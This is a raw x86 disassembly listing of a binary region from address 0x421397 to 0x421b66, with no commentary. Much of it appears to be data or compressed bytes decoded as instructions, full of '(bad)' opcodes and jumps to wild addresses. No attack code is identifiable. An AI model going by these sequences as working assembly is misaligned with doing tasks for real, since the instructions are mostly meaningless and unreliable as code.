  421397:	and    BYTE PTR [ebp+0x20],ah
  42139a:	ins    DWORD PTR es:[edi],dx
  42139b:	cmp    al,0x69
  42139d:	ins    DWORD PTR es:[di],dx
  42139f:	jns    0x4213f8
  4213a1:	ins    BYTE PTR es:[edi],dx
  4213a2:	and    ah,BYTE PTR fs:[esi+0x72]
  4213a6:	inc    edi
  4213a7:	sub    al,0x65
  4213a9:	arpl   WORD PTR gs:[ebp+0x3d],sp
  4213ad:	arpl   WORD PTR [eax],sp
  4213af:	bound  ebp,QWORD PTR [esi+0x72]
  4213b2:	jb     0x421416
  4213b4:	cmp    ch,BYTE PTR [ecx+0x67]
  4213b7:	ds gs inc esp
  4213ba:	cs je  0x421432
  4213bd:	data16 jbe 0x421425
  4213c0:	arpl   WORD PTR [edi],bp
  4213c2:	or     ch,BYTE PTR [eax+0x2e]
  4213c5:	je     0x421432
  4213c7:	jbe    0x42141b
  4213c9:	cs jbe 0x421441
  4213cc:	je     0x421425
  4213ce:	and    BYTE PTR [ebp+0x72],ah
  4213d1:	sub    al,0x65
  4213d3:	cmp    al,0x6d
  4213d5:	ins    DWORD PTR es:[edi],dx
  4213d6:	or     dh,BYTE PTR ds:[ebx+0x2e]
  4213da:	jns    0x421442
  4213dc:	jae    0x421451
  4213de:	gs jo  0x421401
  4213e1:	or     eax,0x636d4362
  4213e6:	inc    esp
  4213e7:	jb     0x42144b
  4213e9:	and    BYTE PTR [eax],ah
  4213eb:	ins    DWORD PTR es:[edi],dx
  4213ec:	imul   ebp,DWORD PTR [esi+0x65],0x436f6d28
  4213f3:	arpl   WORD PTR ds:[ebx+0x6e],dx
  4213f7:	gs jne 0x421466
  4213fa:	bound  esp,QWORD PTR [ebx+0x3d]
  4213fd:	jb     0x421461
  4213ff:	and    BYTE PTR [ebp+0x6f],cl
  421402:	gs arpl WORD PTR gs:[edx+0x2e],si
  421407:	arpl   WORD PTR [eax+0x53],di
  42140a:	ins    DWORD PTR es:[edi],dx
  42140b:	cs je  0x421477
  42140e:	gs jae 0x421411
  421411:	add    BYTE PTR [eax],al
  421413:	add    BYTE PTR [eax],al
  421415:	add    al,0x4
  421417:	adc    al,0xdd
  421419:	sub    BYTE PTR [ecx+ebx*8+0x34],al
  42141d:	pop    ss
  42141e:	repnz aas 
  421420:	dec    ebx
  421421:	pop    ebx
  421422:	das    
  421423:	cmp    DWORD PTR [ebp+edx*1-0x70],0x30
  421428:	mov    bh,0xcd
  42142a:	jnp    0x42149c
  42142c:	in     eax,dx
  42142d:	xchg   ecx,eax
  42142e:	(bad)  
  421430:	add    al,0x19
  421432:	add    al,0x4
  421434:	add    al,0x3b
  421436:	xor    eax,DWORD PTR [esp+eax*1]
  421439:	mov    ebp,0x761f0248
  42143e:	adc    BYTE PTR [edi],ch
  421440:	jns    0x4214aa
  421442:	pop    ds
  421443:	push   edi
  421444:	sub    al,0xa1
  421446:	push   esp
  421447:	xor    edx,edi
  421449:	xor    BYTE PTR [eax+0x49],ch
  42144c:	lea    eax,[ecx+edi*8]
  42144f:	in     al,0x12
  421451:	add    al,0xe8
  421453:	sbb    eax,0xe8d3d395
  421458:	call   0x83f93145
  42145d:	daa    
  42145e:	lods   al,BYTE PTR ds:[esi]
  42145f:	call   0x4c64:0xe7204974
  421466:	mov    ecx,0x23c99b87
  42146b:	add    al,BYTE PTR [ecx+edx*2]
  42146e:	sub    esi,DWORD PTR [ebx+0x186abded]
  421474:	ror    bl,cl
  421476:	ror    BYTE PTR [edi+0x683354c5],1
  42147c:	loope  0x421466
  42147e:	call   0xe92b0983
  421483:	call   0xc4e2094
  421488:	or     al,0xc
  42148a:	or     al,0xc
  42148c:	or     al,0xa
  42148e:	cmp    cl,BYTE PTR [esi]
  421490:	jne    0x421507
  421492:	jne    0x421509
  421494:	jne    0x42150b
  421496:	jne    0x42150d
  421498:	jne    0x421427
  42149a:	lea    ebp,ds:0xb2e419ce
  4214a0:	adc    DWORD PTR [ebx],ebp
  4214a2:	das    
  4214a3:	dec    eax
  4214a4:	mov    ah,0xdd
  4214a6:	push   eax
  4214a7:	or     eax,esp
  4214a9:	sbb    DWORD PTR [ecx+0x5b],ebx
  4214ac:	nop
  4214ad:	pop    esi
  4214ae:	jg     0x421470
  4214b0:	cli    
  4214b1:	(bad)  
  4214b2:	sti    
  4214b3:	lea    ecx,[ebp+0x3fad13a0]
  4214b9:	inc    esi
  4214ba:	xchg   DWORD PTR [ecx],ecx
  4214bc:	outs   dx,BYTE PTR ds:[esi]
  4214bd:	js     0x4214bc
  4214bf:	fst    DWORD PTR [edi+0x169337f9]
  4214c5:	adc    ch,ah
  4214c7:	jb     0x4214bd
  4214c9:	push   ss
  4214ca:	pop    ebx
  4214cb:	std    
  4214cc:	and    al,0xfa
  4214ce:	pushf  
  4214cf:	loop   0x421548
  4214d1:	push   0xbf9d8d8d
  4214d6:	sbb    ecx,DWORD PTR [ebp+0x49c6e8d]
  4214dc:	lea    eax,[eax]
  4214de:	add    al,0xcf
  4214e0:	jae    0x421487
  4214e2:	mov    bl,0x6
  4214e4:	(bad)
  4214e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214e9:	pusha  
  4214ea:	pop    ecx
  4214eb:	pop    DWORD PTR [edx]
  4214ed:	and    dl,BYTE PTR [eax-0x73a94250]
  4214f3:	(bad)  
  4214f4:	fisub  DWORD PTR [edx]
  4214f6:	add    BYTE PTR [eax],al
  4214f8:	add    BYTE PTR [eax],cl
  4214fa:	lahf   
  4214fb:	add    BYTE PTR [eax],al
  4214fd:	sbb    BYTE PTR [edx],0x0
	...
  421508:	add    BYTE PTR [eax],al
  42150a:	add    BYTE PTR [edi],ah
  42150c:	sti    
  42150d:	xchg   esp,eax
  42150e:	push   ss
  42150f:	sar    DWORD PTR [ebp+0x22],0x7e
  421513:	dec    ecx
  421514:	sbb    dl,dl
  421516:	push   ebp
  421517:	cmp    eax,0x64db4bc7
  42151c:	fdiv   DWORD PTR [edx+edx*4+0x758587bc]
	...
  42152b:	add    bh,bh
  42152d:	jmp    esp
  42152f:	add    eax,0xffff6640
  421534:	mov    dh,0x57
  421536:	push   edi
  421537:	aaa    
  421538:	and    ebx,DWORD PTR [edx+0x26fd3c50]
  42153e:	mov    DWORD PTR [eax-0x37],eax
  421541:	(bad)  
  421542:	mov    dl,0xa9
  421544:	sbb    esi,0xa21e0b34
  42154a:	bnd jp 0x421564
  42154d:	jne    0x42158f
  42154f:	adc    eax,0xf7692723
  421554:	daa    
  421555:	or     BYTE PTR [edi+edi*8-0x3c8101],dh
  42155c:	dec    DWORD PTR [ecx]
  42155e:	retf   0xff95
  421561:	add    al,0x8
  421563:	cwde   
  421564:	call   0x9ffa:0xc669f85f
  42156b:	fld    QWORD PTR [ebx+0x1f]
  42156e:	pop    eax
  42156f:	inc    ebp
  421570:	adc    edx,DWORD PTR [ecx-0x55]
  421573:	xor    BYTE PTR [ecx+edx*8],bl
  421576:	fild   DWORD PTR [esi]
  421578:	xchg   ebx,eax
  421579:	or     BYTE PTR [esp+eax*1],al
  42157c:	add    al,0xff
  42157e:	fcomp  QWORD PTR [ecx+eiz*8]
  421581:	out    0x71,eax
  421583:	add    eax,0xcee48ad8
  421588:	in     al,dx
  421589:	loopne 0x42158d
  42158b:	popa   
  42158c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42158d:	lods   eax,DWORD PTR ds:[esi]
  42158e:	stos   DWORD PTR es:[edi],eax
  42158f:	int3   
  421590:	fmul   DWORD PTR ds:0x98e33687
  421596:	xchg   edi,eax
  421597:	jle    0x421543
  421599:	pop    DWORD PTR [esp+eax*1]
  42159c:	test   esi,0x4040495
	...
  4215aa:	add    BYTE PTR [esi+edx*4],dh
  4215ad:	sti    
  4215ae:	xor    esi,DWORD PTR [ebx]
  4215b0:	xor    esi,DWORD PTR [ebx]
  4215b2:	xor    esi,DWORD PTR [ebx]
  4215b4:	xor    esi,DWORD PTR [ebx]
  4215b6:	xor    eax,DWORD PTR [eax]
  4215b8:	add    BYTE PTR [edx+0x2b],ah
  4215bb:	out    0xd2,al
  4215bd:	dec    eax
  4215be:	inc    ebp
  4215bf:	or     bl,ah
  4215c1:	fs pop edx
  4215c3:	aad    0x80
  4215c5:	inc    esp
  4215c6:	call   0x18e8bc00
  4215cb:	mov    dl,0x11
  4215cd:	mov    ecx,0xfe32bc
  4215d2:	add    ah,cl
  4215d4:	xor    al,0x0
  4215d6:	add    ch,bl
  4215d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215d9:	add    BYTE PTR [eax],al
  4215db:	xchg   ebp,eax
  4215dc:	out    dx,al
  4215dd:	lea    esp,[ecx-0x60]
  4215e0:	xchg   esi,eax
  4215e1:	pop    edi
  4215e2:	sahf   
  4215e3:	(bad)  
  4215e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215e5:	jnp    0x421583
  4215e7:	ret    0x72f2
  4215ea:	clc    
  4215eb:	lods   eax,DWORD PTR ds:[esi]
  4215ec:	xor    al,0x4e
  4215ee:	inc    edx
  4215ef:	jl     0x4215c4
  4215f1:	scas   al,BYTE PTR es:[edi]
  4215f2:	popa   
  4215f3:	add    al,ch
  4215f5:	repnz neg BYTE PTR [edi-0x17171710]
  4215fc:	in     al,dx
  4215fd:	sbb    BYTE PTR [eax+eiz*8],bl
  421600:	push   esi
  421601:	add    eax,0x59ae78ac
  421606:	push   edx
  421607:	jg     0x421669
  421609:	push   DWORD PTR [eax-0x25c3dbe9]
  42160f:	inc    esi
  421610:	ror    DWORD PTR [esi],0x75
  421613:	xchg   esp,eax
  421614:	les    edx,FWORD PTR [edx]
  421616:	mov    ds:0xcba3632b,eax
  42161b:	cmp    eax,0xe880b769
  421620:	call   0xe92a2a7e
  421625:	call   0x8dcfa3b7
  42162a:	lea    ecx,[ebp-0xb727273]
  421630:	int3   
  421631:	jae    0x421633
	...
  42163b:	add    BYTE PTR [eax],al
  42163d:	mov    ebp,0xb30b5a9d
  421642:	ds pop edi
  421644:	mov    bl,0xf2
  421646:	pop    ebp
  421647:	(bad)  
  421648:	sti    
  421649:	xor    bl,BYTE PTR [ecx]
  42164b:	pop    esp
  42164c:	loop   0x4216c2
  42164e:	mov    dh,0x20
  421650:	or     eax,0xae06be94
  421655:	add    BYTE PTR [eax],al
  421657:	outs   dx,BYTE PTR ds:[esi]
  421658:	nop
  421659:	ins    DWORD PTR es:[edi],dx
  42165a:	add    ah,bl
  42165c:	mov    esp,0xe61dedc4
  421661:	jo     0x421679
  421663:	sub    esi,ebp
  421665:	shr    DWORD PTR [ebx],cl
  421667:	push   eax
  421668:	test   ebx,esp
  42166a:	iret   
  42166b:	ja     0x42164e
  42166d:	push   0x36
  42166f:	mov    ecx,0x299383cf
  421674:	add    BYTE PTR [eax],al
  421676:	or     dh,BYTE PTR [eax]
  421678:	pop    edx
  421679:	add    BYTE PTR [eax],al
  42167b:	jo     0x4216c9
  42167d:	clc    
  42167e:	add    BYTE PTR [ebx-0x1e4fd373],cl
  421684:	push   ebp
  421685:	push   0x1
  421687:	aam    0x45
  421689:	fisttp WORD PTR [ebp+0x30de0343]
  42168f:	dec    ebp
  421690:	fstp   TBYTE PTR [edx-0x4a]
  421693:	ss dec ebp
  421695:	into   
  421696:	repz sub ecx,DWORD PTR [ebx+0x24028b8b]
  42169d:	mov    ecx,DWORD PTR [ebx-0x7474d7eb]
  4216a3:	mov    eax,DWORD PTR [eax]
	...
  4216ad:	jl     0x421704
  4216af:	push   edx
  4216b0:	inc    edi
  4216b1:	ficom  WORD PTR [ecx-0x6b]
  4216b4:	adc    edi,DWORD PTR [ecx]
  4216b6:	je     0x421643
  4216b8:	sbb    al,0x51
  4216ba:	rol    cl,1
  4216bc:	fnsave [ecx]
  4216be:	sub    eax,0x78b7ffda
  4216c3:	dec    eax
  4216c4:	mov    bl,0x33
  4216c6:	xor    esi,DWORD PTR [ebx]
  4216c8:	xor    esi,DWORD PTR [ebx]
  4216ca:	xor    esi,DWORD PTR [ebx]
  4216cc:	xor    esi,DWORD PTR [ebx]
  4216ce:	(bad)  
  4216cf:	vmwrite edi,DWORD PTR [ebx+0x59]
  4216d3:	mov    ebx,0xda370f0f
  4216d8:	xor    ebp,DWORD PTR [esi+0x61]
  4216db:	into   
  4216dc:	pop    esi
  4216dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216de:	repnz or al,0x3e
  4216e1:	ds mov ch,0x92
  4216e4:	(bad)  
  4216e5:	pop    edi
  4216e6:	push   ds
  4216e7:	pop    ecx
  4216e8:	loope  0x421752
  4216ea:	ret    
  4216eb:	fisttp WORD PTR [ebx*2+0x1c75f2b6]
  4216f2:	jmp    0xd8e5711b
  4216f7:	fs repnz (bad) 
  4216fa:	pmulhuw mm0,mm2
  4216fd:	(bad)  
  4216fe:	(bad)  
  421700:	cs es (bad) 
  421704:	jnp    0x42168a
  421706:	out    0xa,al
  421708:	xchg   ebp,eax
  421709:	out    dx,al
  42170a:	or     eax,0x35a2cf0d
  42170f:	and    dl,BYTE PTR [eax]
  421711:	lds    ebp,FWORD PTR [ebp+0x54de51f]
  421717:	mov    ah,0x1
  421719:	xor    DWORD PTR [edx],edi
  42171b:	loopne 0x42171d
  42171d:	add    BYTE PTR [eax],al
  42171f:	xchg   edi,eax
  421720:	sahf   
  421721:	dec    ebp
  421722:	cli    
  421723:	sahf   
  421724:	in     eax,0xdd
  421726:	mov    al,0x19
  421728:	imul   esi,DWORD PTR [ecx+ebp*1],0x1a
  42172c:	dec    edx
  42172d:	cmp    DWORD PTR [edi-0x20],ecx
  421730:	sar    bh,1
  421732:	jmp    0xf47b:0x332920dd
  421739:	push   ecx
  42173a:	outs   dx,DWORD PTR ds:[esi]
  42173b:	add    DWORD PTR [eax],0x2f32cc00
  421741:	add    BYTE PTR [eax],al
  421743:	add    BYTE PTR [eax+0x50],dl
  421746:	push   eax
  421747:	push   eax
  421748:	push   eax
  421749:	push   eax
  42174a:	push   eax
  42174b:	push   eax
  42174c:	push   eax
  42174d:	cmp    al,0xef
  421750:	je     0x4217c6
  421752:	je     0x4217c8
  421754:	je     0x4217ca
  421756:	je     0x4217cc
  421758:	je     0x42175a
  42175a:	add    BYTE PTR [edx],dl
  42175c:	ret    0x17fd
  42175f:	or     eax,0xe92a85e2
  421764:	aas    
  421765:	jl     0x421768
  421767:	dec    edi
  421768:	lahf   
  421769:	cmp    edi,eax
  42176b:	cmp    BYTE PTR [edx],ch
  42176d:	fcmovne st,st(5)
  42176f:	(bad)  
  421770:	mov    ah,0xa6
  421772:	add    BYTE PTR ds:[eax],al
  421775:	mov    ds:0x29000033,al
  42177a:	add    eax,DWORD PTR [eax]
  42177c:	add    BYTE PTR [ecx+0x6a],dl
  42177f:	not    DWORD PTR [edi+0x17]
  421782:	loopne 0x421715
  421784:	(bad)  
  421785:	ins    BYTE PTR es:[edi],dx
  421786:	(bad)  
  421787:	or     dh,BYTE PTR [esi-0x3b4f5781]
  42178d:	loop   0x421716
  42178f:	pop    esi
  421790:	and    DWORD PTR [edx+0xa67077],esi
  421796:	jmp    FWORD PTR [eax]
  421798:	gs gs jb 0x42180c
  42179c:	ins    DWORD PTR es:[edi],dx
  42179d:	or     eax,0x63736374
  4217a2:	and    ah,BYTE PTR gs:[ebp+0x72]
  4217a6:	jae    0x42180d
  4217a8:	and    BYTE PTR [edi+0x75],dh
  4217ab:	jb     0x421804
  4217ad:	gs dec ebp
  4217af:	cmp    al,0x4d
  4217b1:	cmp    dh,BYTE PTR [eax+0x75]
  4217b4:	jb     0x421826
  4217b6:	jne    0x421826
  4217b8:	je     0x421827
  4217ba:	and    dh,BYTE PTR [ebx+0x73]
  4217bd:	sub    BYTE PTR [esi+ebp*2+0x20],dh
  4217c1:	outs   dx,BYTE PTR ds:[esi]
  4217c2:	ds or  ah,BYTE PTR gs:[ecx+0x69]
  4217c7:	and    BYTE PTR [ecx+0x23],ch
  4217ca:	arpl   WORD PTR ds:[ecx+0x6d],di
  4217ce:	jb     0x421835
  4217d0:	and    BYTE PTR [ebx+0x72],dh
  4217d3:	ins    DWORD PTR es:[edi],dx
  4217d4:	cmp    al,0x6d
  4217d6:	imul   esp,DWORD PTR cs:[ecx+0x62],0x3a6f7369
  4217de:	jne    0x42182d
  4217e0:	cmp    al,0x69
  4217e2:	gs gs sub al,0x20
  4217e6:	ins    DWORD PTR es:[edi],dx
  4217e7:	ins    DWORD PTR es:[edi],dx
  4217e8:	outs   dx,BYTE PTR ds:[esi]
  4217ea:	outs   dx,DWORD PTR ds:[esi]
  4217eb:	popa   
  4217ec:	push   edi
  4217ed:	imul   esp,DWORD PTR [ebp+0x72],0x65727841
  4217f4:	arpl   WORD PTR [edx+0x6f],sp
  4217f7:	and    BYTE PTR [esi+0x75],ch
  4217fa:	and    BYTE PTR [eax],ah
  4217fc:	outs   dx,BYTE PTR ds:[esi]
  4217fd:	jo     0x42186d
  4217ff:	imul   esi,DWORD PTR [esp+edi*2-0xf],0xffffff2e
  421807:	sbb    esp,DWORD PTR [edx+ebx*1-0x73]
  42180b:	loopne 0x4217bc
  42180d:	inc    ecx
  42180e:	lea    esp,[ebx]
  421810:	dec    esi
  421811:	imul   ebx,esp,0xbd880a53
  421817:	fidivr DWORD PTR [edi-0x52]
  42181a:	scas   al,BYTE PTR es:[edi]
  42181b:	or     al,0xce
  42181d:	sti    
  42181e:	sub    BYTE PTR [ecx+0x55],0x72
  421822:	cmc    
  421823:	addr16 mov ebp,0x900175d8
  421829:	pusha  
  42182a:	(bad)  
  42182b:	call   FWORD PTR [esi-0x3d]
  42182e:	(bad)  
  42182f:	(bad)  
  421830:	dec    DWORD PTR [ecx-0x76767677]
  421836:	mov    DWORD PTR [ecx-0x145d7677],ecx
  42183c:	test   edi,edi
  42183e:	(bad)  
  42183f:	(bad)  
  421840:	(bad)  
  421841:	(bad)  
  421842:	(bad)  
  421843:	(bad)  
  421844:	(bad)  
  421845:	(bad)  
  421846:	call   0x9c203d33
  42184b:	inc    DWORD PTR [esi-0x480723c9]
  421851:	mov    dl,0x6a
  421853:	sub    BYTE PTR [ecx+ebp*1],dl
  421856:	rcl    ecx,0x1c
  421859:	js     0x75cb4efc
  42185f:	or     eax,ebp
  421861:	call   0x9346adf2
  421866:	cmc    
  421867:	sub    DWORD PTR [eax],esp
  421869:	adc    al,0xc7
  42186b:	iret   
  42186c:	mov    al,0x96
  42186e:	jmp    0x743a15e5
  421873:	in     eax,dx
  421874:	lods   al,BYTE PTR ss:[esi]
  421876:	xchg   edx,eax
  421877:	test   al,0x19
  421879:	das    
  42187a:	adc    bl,BYTE PTR [ebp+0x16]
  42187d:	mov    ax,gs
  421880:	call   0xe860ed20
  421885:	call   0xe9370716
  42188a:	(bad)  
  42188b:	mov    ebp,0xf854af57
  421890:	outs   dx,BYTE PTR ds:[esi]
  421891:	ja     0x42186e
  421893:	pushf  
  421894:	sbb    al,BYTE PTR [edi+0x4a]
  421897:	push   ds
  421898:	jecxz  0x42181c
  42189a:	shr    BYTE PTR [edi+eiz*2+0x51aecdee],cl
  4218a1:	lds    esp,FWORD PTR [eax-0x1]
  4218a4:	(bad)  
  4218a5:	call   FWORD PTR [esi-0x60000020]
  4218ab:	and    bh,bh
  4218ad:	(bad)  
  4218ae:	(bad)  
  4218af:	call   0xe92b019c
  4218b4:	call   0x912b01a1
  4218b9:	xchg   ecx,eax
  4218ba:	ss ss nop
  4218bd:	push   esi
  4218be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218bf:	jge    0x421905
  4218c1:	imul   esp,DWORD PTR [ebp-0x27],0x898ac16d
  4218c8:	cmp    BYTE PTR [ecx-0x13],bh
  4218cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218cc:	inc    ecx
  4218cd:	fisub  WORD PTR [eax-0x39]
	...
  4218d8:	add    ah,cl
  4218da:	int3   
  4218db:	xchg   BYTE PTR [esi+0x5c],al
  4218de:	mov    al,0xcc
  4218e0:	int3   
  4218e1:	out    dx,al
  4218e2:	inc    ebx
  4218e3:	jno    0x421961
  4218e5:	hlt    
  4218e6:	cs shl esp,0x18
  4218ea:	ss adc edi,ebx
  4218ed:	es sbb eax,eax
  4218f0:	and    esi,DWORD PTR [edx]
  4218f2:	jb     0x4218bc
  4218f4:	jle    0x421947
  4218f6:	dec    eax
  4218f7:	mov    ah,0xc1
  4218f9:	dec    edx
  4218fa:	add    ecx,DWORD PTR ds:0xc35ab5f4
  421900:	mov    ah,0x61
  421902:	cmp    cl,ch
  421904:	int3   
  421905:	int3   
  421906:	push   ss
  421907:	xchg   ebx,eax
  421908:	int3   
  421909:	int3   
  42190a:	adc    dh,ch
  42190c:	mov    cs,esp
  42190e:	add    bh,ah
  421910:	(bad)  
  421911:	or     eax,eax
  421913:	aad    0x7b
  421915:	sub    bl,BYTE PTR [edx-0x52]
  421918:	arpl   WORD PTR [edi],si
  42191a:	or     DWORD PTR [eax],ebx
  42191c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42191d:	xchg   DWORD PTR [esi+ebx*8],edx
  421920:	jae    0x4218b4
  421922:	jmp    0x0:0xf293f863
  421929:	add    BYTE PTR [edi-0x62],cl
  42192c:	test   DWORD PTR [edi+0x55],edx
  42192f:	xchg   esp,eax
  421930:	cld    
  421931:	or     DWORD PTR [esi],esp
  421933:	aaa    
  421934:	fs ja  0x42191e
  421937:	mov    ah,0xca
  421939:	call   DWORD PTR [edi]
  42193b:	pop    eax
  42193c:	dec    bx
  42193e:	dec    eax
  42193f:	adc    ebp,DWORD PTR [esi-0x72]
  421942:	push   eax
  421943:	sub    al,0x71
  421945:	in     eax,0x78
  421947:	add    BYTE PTR [eax],al
  421949:	mov    edx,0x5bed
	...
  421956:	add    BYTE PTR [eax],al
  421958:	xor    eax,0x352d
  42195d:	add    BYTE PTR [eax],al
  42195f:	add    BYTE PTR [eax],al
  421961:	add    BYTE PTR [eax],al
  421963:	add    al,ch
  421965:	call   0x4690a1a5
  42196a:	jl     0x4219c6
  42196c:	fcmovbe st,st(2)
  42196e:	push   0x878cca79
  421973:	inc    eax
  421974:	fcom   QWORD PTR [edi-0x7a]
  421977:	inc    edi
  421978:	sub    al,0x47
  42197a:	daa    
  42197b:	(bad)  
  42197d:	mov    cl,0xe8
  42197f:	call   0xe92a39c8
  421984:	adc    eax,DWORD PTR [esi+0x147fe8e8]
  42198a:	xchg   ebp,eax
  42198b:	mov    ds:0x73d4d6be,al
  421990:	mov    ds:0x25c634ea,eax
  421995:	xor    esi,esp
  421997:	enter  0xfac4,0x92
  42199b:	xchg   edi,eax
  42199c:	mov    ds:0xe838a7c5,eax
  4219a1:	add    bh,al
  4219a3:	icebp  
  4219a4:	je     0x421a1c
  4219a6:	add    BYTE PTR [eax],al
  4219a8:	add    BYTE PTR [edx],al
  4219aa:	mov    ds:0xe8dfc7a5,al
  4219af:	into   
  4219b0:	xchg   BYTE PTR [edx+0x11434257],ah
  4219b6:	leave  
  4219b7:	push   ds
  4219b8:	jmp    0x421a24
  4219ba:	lods   al,BYTE PTR ds:[esi]
  4219bb:	sub    DWORD PTR [esi],ebx
  4219bd:	in     al,0xfe
  4219bf:	jmp    0xa23afc24
  4219c4:	in     eax,0xf2
  4219c6:	jns    0x4219b0
  4219c8:	test   BYTE PTR [esi],ah
  4219ca:	loopne 0x4219cd
  4219cc:	add    BYTE PTR [eax],al
  4219ce:	mov    dl,0x6d
	...
  4219dc:	add    al,0xbc
  4219de:	mov    ebp,0x50505050
  4219e3:	push   eax
  4219e4:	push   eax
  4219e5:	push   eax
  4219e6:	push   eax
  4219e7:	push   eax
  4219e8:	add    BYTE PTR [eax],al
  4219ea:	push   eax
  4219eb:	add    DWORD PTR [esi],edx
  4219ed:	sbb    ch,bl
  4219ef:	mov    cl,0x3c
  4219f1:	mov    bh,0xd8
  4219f3:	jmp    0xc30a8d24
  4219f8:	dec    esi
  4219f9:	add    al,0xcc
  4219fb:	inc    BYTE PTR [edx+0xe]
  4219fe:	inc    edi
  4219ff:	sub    ecx,esi
  421a01:	pop    edx
  421a02:	add    BYTE PTR [eax],al
  421a04:	inc    ebx
  421a05:	std    
  421a06:	dec    edi
  421a07:	mov    bh,0x89
  421a09:	pusha  
  421a0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a0b:	stos   BYTE PTR es:[edi],al
  421a0c:	shr    esi,cl
  421a0e:	fbstp  TBYTE PTR [edx+0x63794fb4]
  421a14:	and    al,0xad
  421a16:	pop    ecx
  421a17:	xor    dh,dl
  421a19:	mov    esi,0xd3e7a25e
  421a1e:	imul   BYTE PTR [edx]
  421a20:	mov    ah,0x0
  421a22:	add    dh,bl
  421a24:	cwde   
  421a25:	sldt   WORD PTR [eax]
  421a28:	fs enter 0xe7,0x89
  421a2d:	push   esp
  421a2e:	push   ecx
  421a2f:	jmp    0x421a61
  421a31:	nop
  421a32:	pop    ebx
  421a33:	inc    edi
  421a34:	pushf  
  421a35:	stos   DWORD PTR es:[edi],eax
  421a36:	sub    edx,DWORD PTR [edx]
  421a38:	imul   ebx,DWORD PTR ds:0x96a573e4,0x23
  421a3f:	scas   eax,DWORD PTR es:[edi]
  421a40:	fiadd  DWORD PTR [ebx-0x76fedd10]
  421a46:	mov    DWORD PTR [ecx-0x76768b78],ecx
  421a4c:	retf   
  421a4d:	push   0xffffff89
  421a4f:	mov    DWORD PTR [ecx-0x74747475],ecx
  421a55:	mov    ecx,DWORD PTR [ebx+0xf8b8b8b]
  421a5b:	iret   
  421a5c:	inc    ebp
  421a5d:	pushf  
  421a5e:	jge    0x421ac3
  421a60:	push   ebp
  421a61:	ja     0x421a08
  421a63:	or     edx,DWORD PTR [edx]
  421a65:	lea    esi,es:[esi]
  421a68:	sti    
  421a69:	imul   ebp,edi,0x99e37541
  421a6f:	sub    dh,bh
  421a71:	pop    es
  421a72:	(bad)  
  421a73:	(bad)  
  421a74:	(bad)  
  421a75:	(bad)  
  421a76:	(bad)  
  421a77:	(bad)  
  421a78:	(bad)  
  421a79:	(bad)  
  421a7a:	(bad)  
  421a7b:	(bad)  
  421a7c:	(bad)  
  421a7d:	cld    
  421a7e:	lea    ebp,[edx]
  421a80:	sar    bh,cl
  421a82:	(bad)  
  421a83:	std    
  421a84:	mov    eax,ds:0xdd55e519
  421a89:	jns    0x421aac
  421a8b:	scas   eax,DWORD PTR es:[edi]
  421a8c:	mov    edi,0xdec31a7d
  421a91:	das    
  421a92:	scas   eax,DWORD PTR es:[edi]
  421a93:	inc    ebx
  421a94:	pop    ss
  421a95:	add    BYTE PTR [ecx+0x75],bh
  421a98:	jl     0x421a6e
  421a9a:	ss add eax,0x45f4f14a
  421aa0:	cs mov eax,0x8b092736
  421aa6:	(bad)  
  421aa7:	push   esp
  421aa9:	fwait
  421aaa:	(bad)  
  421aab:	dec    DWORD PTR [ebx-0x76004c41]
  421ab1:	outs   dx,DWORD PTR ds:[esi]
  421ab2:	sbb    al,0x30
  421ab4:	aam    0xce
  421ab6:	fs loop 0x421acf
  421ab9:	xchg   ebp,eax
  421aba:	xchg   BYTE PTR [eax+0x6c81adc6],dl
  421ac0:	pop    edi
  421ac1:	mov    edi,0x8d1af99f
  421ac6:	inc    edx
  421ac7:	sahf   
  421ac8:	mov    DWORD PTR [ecx-0x14f77677],ecx
  421ace:	pop    edx
  421acf:	mov    ah,ch
  421ad1:	jns    0x421a83
  421ad3:	mov    al,BYTE PTR [ebx]
  421ad5:	in     al,dx
  421ad6:	and    DWORD PTR [esp+edi*8+0x288a4633],0x1aba5703
  421ae1:	repz and ecx,DWORD PTR [esi-0x23362ed9]
  421ae8:	fisttp WORD PTR [ecx-0x3605ae77]
  421aee:	mov    DWORD PTR [ecx+0x89],ecx
  421af4:	add    BYTE PTR [eax],al
  421af6:	add    BYTE PTR [eax],al
  421af8:	add    BYTE PTR [eax],al
  421afa:	dec    edx
  421afb:	add    al,0xcb
	...
  421b05:	add    BYTE PTR [esp+esi*2+0x17],dh
  421b09:	(bad)  
  421b0a:	fsub   DWORD PTR [eax]
  421b0c:	jb     0x421b7b
  421b0e:	inc    esp
  421b0f:	arpl   WORD PTR [esi+0x69],si
  421b12:	and    BYTE PTR [eax],ah
  421b14:	inc    ebx
  421b15:	bound  edi,QWORD PTR [esi]
  421b17:	cmp    al,0x72
  421b19:	je     0x421b80
  421b1b:	imul   eax,DWORD PTR [ecx+0x70],0x61796720
  421b22:	jae    0x421b93
  421b24:	je     0x421b9c
  421b26:	outs   dx,BYTE PTR ds:[esi]
  421b27:	jbe    0x421b8e
  421b29:	je     0x421b94
  421b2b:	ins    DWORD PTR es:[edi],dx
  421b2c:	jb     0x421ba0
  421b2e:	jb     0x421b9e
  421b30:	ins    DWORD PTR es:[edi],dx
  421b31:	arpl   WORD PTR cs:[esi+0x72],si
  421b35:	gs dec ebp
  421b37:	jb     0x421bab
  421b39:	ins    DWORD PTR es:[edi],dx
  421b3a:	jb     0x421bab
  421b3c:	cs and BYTE PTR cs:[edx+0x29],ah
  421b41:	je     0x421bb1
  421b43:	imul   ebp,DWORD PTR [edi+0x6f],0x6b41780d
  421b4a:	inc    esp
  421b4b:	push   edi
  421b4c:	outs   dx,BYTE PTR ds:[esi]
  421b4d:	inc    ebp
  421b4e:	jbe    0x421bb1
  421b50:	jb     0x421bb3
  421b52:	or     cl,BYTE PTR ds:0x706d3e62
  421b58:	gs gs gs jne 0x421bcf
  421b5d:	pop    ebx
  421b5e:	gs gs ins DWORD PTR es:[edi],dx
  421b61:	jo     0x421bc8
  421b63:	outs   dx,DWORD PTR ds:[esi]
  421b64:	jae    0x421bcd
  421b66:	gs cs and BYTE PTR gs:[edx+0x20],dl
